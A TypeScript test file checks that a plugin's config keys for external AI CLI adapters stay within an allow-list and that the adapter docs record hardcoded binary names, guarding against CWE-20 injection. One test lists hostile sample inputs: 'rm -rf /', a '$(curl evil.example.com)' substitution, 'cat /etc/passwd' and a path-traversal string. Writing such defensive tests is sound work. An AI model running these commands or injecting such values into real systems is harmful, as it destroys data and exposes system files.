/**
 * Task 88 (Phase 11.2): CLI-name key validation in Layer 1 schema +
 * adapter Step 1 safe-name assertion.
 *
 * [T] criteria from the plan:
 *   1. Layer 1 test asserts every non-`default` key in
 *      external_permission_mode is in {codex, claude, gemini, bedrock, llm, ollama}
 *   2. defaults.yaml inline comment documents that unknown keys are
 *      silently ignored and not passed to shell invocation
 *   3. Each adapter's Step 1 (CLI Presence Check) documents the
 *      safe-name assertion before `which`
 *
 * Defense-in-depth for CWE-20 (Improper Input Validation): the
 * shipped config can only contain known-safe keys; the adapter
 * binary names are hardcoded; together this prevents an adversarial
 * project config from injecting path-traversal or shell-metacharacter
 * binary names into `which` lookups.
 */

import { describe, it, expect, beforeAll } from 'vitest';
import { readFileSync } from 'fs';
import { join } from 'path';
import { loadDefaultsYaml, loadDefaultsYamlText } from '../helpers/load-defaults';

const REPO_ROOT = join(__dirname, '..', '..');
const AGENTS_DIR = join(REPO_ROOT, 'plugins', 'synthex', 'agents');

const SAFE_KEY_SET = new Set([
  'default',
  'codex',
  'claude',
  'gemini',
  'bedrock',
  'llm',
  'ollama',
]);

const ADAPTERS = [
  { agent: 'codex-review-prompter.md', cliBinary: 'codex' },
  { agent: 'claude-review-prompter.md', cliBinary: 'claude' },
  { agent: 'gemini-review-prompter.md', cliBinary: 'gemini' },
  // Note: bedrock adapter wraps `aws bedrock-runtime`, so its binary is `aws`.
  { agent: 'bedrock-review-prompter.md', cliBinary: 'aws' },
  { agent: 'llm-review-prompter.md', cliBinary: 'llm' },
  { agent: 'ollama-review-prompter.md', cliBinary: 'ollama' },
];

describe('Task 88 [T] (1): Layer 1 enum-key validation for external_permission_mode', () => {
  let block: any;

  beforeAll(async () => {
    const cfg = await loadDefaultsYaml();
    block = cfg?.multi_model_review?.external_permission_mode ?? {};
  });

  it('block exists', () => {
    expect(block).toBeTruthy();
  });

  it('every key in the block is a member of the safe set {default, codex, claude, gemini, bedrock, llm, ollama}', () => {
    const unknownKeys: string[] = [];
    for (const key of Object.keys(block)) {
      if (!SAFE_KEY_SET.has(key)) {
        unknownKeys.push(key);
      }
    }
    expect(
      unknownKeys,
      `Unknown CLI keys found in external_permission_mode: ${unknownKeys.join(', ')}. ` +
        `Allowed keys are: ${[...SAFE_KEY_SET].join(', ')}. ` +
        `Unknown keys are silently ignored at runtime, but should not appear in the shipped defaults.yaml.`,
    ).toEqual([]);
  });

  it.each([...SAFE_KEY_SET])('safe key "%s" is recognized as valid', (key) => {
    expect(SAFE_KEY_SET.has(key)).toBe(true);
  });

  it('rejects path-traversal-style keys (sanity check on the validator)', () => {
    const malicious = '../../etc/passwd';
    expect(SAFE_KEY_SET.has(malicious)).toBe(false);
  });

  it('rejects shell-metacharacter-style keys (sanity check on the validator)', () => {
    expect(SAFE_KEY_SET.has('; rm -rf /')).toBe(false);
    expect(SAFE_KEY_SET.has('$(curl evil.example.com)')).toBe(false);
    expect(SAFE_KEY_SET.has('codex; cat /etc/passwd')).toBe(false);
  });
});

describe('Task 88 [T] (2): defaults.yaml documents the safe-key allow-list rule', () => {
  let yamlText: string;

  beforeAll(() => {
    yamlText = loadDefaultsYamlText();
  });

  it('documents that unknown keys are silently ignored', () => {
    expect(yamlText).toMatch(/silently ignored|unknown.*ignored|never propagated/i);
  });

  it('documents that adapter binary names are hardcoded (not derived from config keys)', () => {
    expect(yamlText).toMatch(/HARDCODED|hardcoded.*Step 1|are NOT derived from these config-key names/i);
  });

  it('lists the allowed keys explicitly in the inline comment', () => {
    // The comment should enumerate the allowed CLI keys so a maintainer
    // editing defaults.yaml has the allow-list visible at the point of change
    expect(yamlText).toMatch(/codex.*claude.*gemini.*bedrock.*llm.*ollama|Allowed keys/);
  });

  it('cross-references the Layer 1 enum-key validator test by file name', () => {
    expect(yamlText).toContain('external-permission-mode-key-validation.test.ts');
  });

  it('references Task 88 / Phase 11.2 (provenance)', () => {
    expect(yamlText).toMatch(/Task 88|Phase 11\.2|Security MEDIUM #4/);
  });
});

describe('Task 88 [T] (3): each adapter Step 1 documents the safe-name assertion', () => {
  for (const { agent, cliBinary } of ADAPTERS) {
    describe(`${agent}`, () => {
      let content: string;
      beforeAll(() => {
        content = readFileSync(join(AGENTS_DIR, agent), 'utf8');
      });

      it('contains a "Safe-name assertion" subsection', () => {
        expect(content).toContain('Safe-name assertion');
      });

      it(`asserts the binary name "${cliBinary}" is hardcoded in the which invocation`, () => {
        expect(content).toContain(`The binary name \`${cliBinary}\` is HARDCODED`);
      });

      it('asserts the binary name is NOT derived from config keys', () => {
        expect(content).toMatch(
          /does NOT derive the binary name from any config key/,
        );
      });

      it('cross-references the Layer 1 enum-key validator test', () => {
        expect(content).toContain('external-permission-mode-key-validation.test.ts');
      });

      it('lists the safe-key allow-list explicitly', () => {
        expect(content).toMatch(
          /\{codex, claude, gemini, bedrock, llm, ollama, default\}/,
        );
      });

      it('references CWE-20 (Improper Input Validation)', () => {
        expect(content).toContain('CWE-20');
      });

      it('safe-name assertion appears between Step 1 (CLI Presence Check) and Step 2 (Auth Check)', () => {
        const step1Idx = content.indexOf('### 1. CLI Presence Check');
        const step2Idx = content.indexOf('### 2. Auth Check');
        const safeNameIdx = content.indexOf('Safe-name assertion');
        expect(step1Idx).toBeGreaterThan(-1);
        expect(step2Idx).toBeGreaterThan(step1Idx);
        expect(safeNameIdx).toBeGreaterThan(step1Idx);
        expect(safeNameIdx).toBeLessThan(step2Idx);
      });
    });
  }
});
